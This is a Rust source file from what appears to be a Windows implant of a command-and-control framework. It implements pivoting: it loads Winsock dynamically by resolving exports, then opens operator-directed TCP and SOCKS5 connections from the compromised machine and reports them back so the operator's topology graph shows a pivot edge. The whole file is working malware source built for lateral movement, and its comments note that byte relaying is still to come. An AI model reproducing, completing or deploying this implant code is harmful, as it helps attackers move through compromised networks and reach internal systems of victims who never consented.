//! Pivoting (Connect / Socks) for the Windows PIC implant.
//!
//! ## Honest limitation
//! The beacon loop is synchronous-poll and owns the single thread, so it CANNOT
//! host a long-lived bidirectional relay (a relay needs a persistent task or an
//! IOCP reactor that survives across beacon cycles). What we DO here mirrors the
//! dev agent's pragmatic contract: open the outbound connection, confirm it's
//! reachable, and report the channel status back so the operator's topology graph
//! gets a real edge and the operator can confirm reachability end-to-end. Full
//! relay (forwarding bytes between the SOCKS peer and the implant's channel)
//! arrives with the persistent-task/IOCP refactor flagged in the design doc.
//!
//! This keeps the protocol path real — the server can issue Connect/Socks, the
//! implant responds with a Channel status — while being honest that no bytes are
//! forwarded yet.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use nyx_protocol::Response;

// ---- Winsock constants ----------------------------------------------------
const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const FIONBIO: i32 = 0x8004_667Eu32 as i32;
const SOL_SOCKET: i32 = 0xFFFF;
const SO_ERROR: i32 = 0x1007;
const INVALID_SOCKET: usize = usize::MAX;
const INADDR_NONE: u32 = 0xFFFF_FFFF;

#[repr(C)]
#[derive(Clone, Copy)]
struct SockAddrIn {
    sin_family: u16,
    sin_port: u16,
    sin_addr: u32,
    sin_zero: [u8; 8],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct FdSet {
    fd_count: u32,
    fd_array: [usize; 64],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Timeval {
    tv_sec: i32,
    tv_usec: i32,
}

/// Force-load ws2_32.dll (not loaded by default). Mirrors recon.rs's force_load.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

/// `Command::Connect { proto, host, port, chan }`. proto 0 = TCP (the only one
/// supported). Opens a non-blocking connect with a 5s deadline; on success
/// reports `Response::Channel { chan, status: 0 (open), data: [] }` so the
/// operator's topology graph draws the pivot edge. The socket is then closed —
/// see module docs (no persistent relay yet).
pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
    if proto != 0 {
        return Response::Err({
            let mut e = String::from("connect: unsupported proto ");
            push_decimal(&mut e, proto as u32);
            e.push_str(" (only TCP=0)");
            e
        });
    }
    if !force_load(b"ws2_32.dll") {
        return Response::Err(String::from("connect: ws2_32.dll load failed"));
    }
    type WSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
    type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
    type CloseSocket = unsafe extern "system" fn(usize) -> i32;
    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
    type SelectFn = unsafe extern "system" fn(
        i32,
        *const FdSet,
        *const FdSet,
        *const FdSet,
        *const Timeval,
    ) -> i32;
    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
    type WSACleanup = unsafe extern "system" fn() -> i32;
    type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;

    let startup: WSAStartup = match unsafe { export_addr(b"ws2_32.dll", b"WSAStartup") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: WSAStartup unresolved")),
    };
    let cleanup: WSACleanup = match unsafe { export_addr(b"ws2_32.dll", b"WSACleanup") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: WSACleanup unresolved")),
    };
    let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: socket unresolved")),
    };
    let connect_fn: ConnectFn = match unsafe { export_addr(b"ws2_32.dll", b"connect") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: connect unresolved")),
    };
    let closesocket: CloseSocket = match unsafe { export_addr(b"ws2_32.dll", b"closesocket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: closesocket unresolved")),
    };
    let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: ioctlsocket unresolved")),
    };
    let select_fn: SelectFn = match unsafe { export_addr(b"ws2_32.dll", b"select") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: select unresolved")),
    };
    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: inet_addr unresolved")),
    };
    let getsockopt: GetSockOpt = match unsafe { export_addr(b"ws2_32.dll", b"getsockopt") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: getsockopt unresolved")),
    };

    // Resolve the IPv4 (NUL-terminated for inet_addr).
    let mut hostz = [0u8; 256];
    let hn = host.as_bytes().len().min(hostz.len() - 1);
    hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
    let addr = unsafe { inet_addr(hostz.as_ptr()) };
    if addr == INADDR_NONE {
        return Response::Err(String::from("connect: invalid IPv4 address"));
    }

    let mut wsadata = [0u8; 404];
    if unsafe { startup(0x0202, wsadata.as_mut_ptr()) } != 0 {
        return Response::Err(String::from("connect: WSAStartup failed"));
    }

    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
    if s == INVALID_SOCKET {
        unsafe { cleanup() };
        return Response::Err(String::from("connect: socket() failed"));
    }
    let mut mode: u32 = 1;
    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };

    let sa = SockAddrIn {
        sin_family: AF_INET as u16,
        sin_port: port.swap_bytes(),
        sin_addr: addr,
        sin_zero: [0; 8],
    };
    let _ = unsafe { connect_fn(s, &sa, 16) };

    let mut fdarr = [0usize; 64];
    fdarr[0] = s;
    let wfds = FdSet { fd_count: 1, fd_array: fdarr };
    let tv = Timeval { tv_sec: 5, tv_usec: 0 };
    let n = unsafe { select_fn(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };

    let mut ok = false;
    if n > 0 {
        let mut err: i32 = 0;
        let mut errlen: i32 = 4;
        let r = unsafe {
            getsockopt(s, SOL_SOCKET, SO_ERROR, &mut err as *mut i32 as *mut u8, &mut errlen)
        };
        if r == 0 && err == 0 {
            ok = true;
        }
    }
    let _ = unsafe { closesocket(s) };
    unsafe { cleanup() };

    if ok {
        // status 0 = channel open. No data forwarded (see module docs).
        Response::Channel { chan, status: 0, data: Vec::new() }
    } else {
        Response::Err({
            let mut e = String::from("connect ");
            e.push_str(host);
            e.push(':');
            // decimal port (no format! under no_std)
            let mut buf = [0u8; 6];
            let mut k = buf.len();
            let mut v = port as u64;
            if v == 0 {
                k -= 1;
                buf[k] = b'0';
            } else {
                while v != 0 {
                    k -= 1;
                    buf[k] = b'0' + (v % 10) as u8;
                    v /= 10;
                }
            }
            e.push_str(core::str::from_utf8(&buf[k..]).unwrap_or("?"));
            e.push_str(": unreachable (5s)");
            e
        })
    }
}

/// `Command::Socks { chan, op, addr, port }`. op 1 = SOCKS5 CONNECT request
/// (the common case). Like Connect, we open + confirm + close — no relay yet.
/// Other ops (bind 2, udp associate 3) are unsupported.
pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
    match op {
        1 => {
            // Reuse the connect path; on success return a Channel open with a
            // short note that the relay itself isn't forwarding yet.
            match do_connect(0, addr, port, chan) {
                Response::Channel { chan, status, .. } => {
                    let note = String::from("socks connect acknowledged (relay not yet forwarding)");
                    Response::Channel { chan, status, data: note.into_bytes() }
                }
                other => other,
            }
        }
        other => Response::Err({
            let mut e = String::from("socks: unsupported op ");
            push_decimal(&mut e, other as u32);
            e.push_str(" (only connect=1)");
            e
        }),
    }
}

/// Append `v` in decimal to `s` (no `format!`/`to_string` under no_std).
fn push_decimal(s: &mut String, mut v: u32) {
    if v == 0 {
        s.push('0');
        return;
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    for &b in &tmp[i..] {
        s.push(b as char);
    }
}
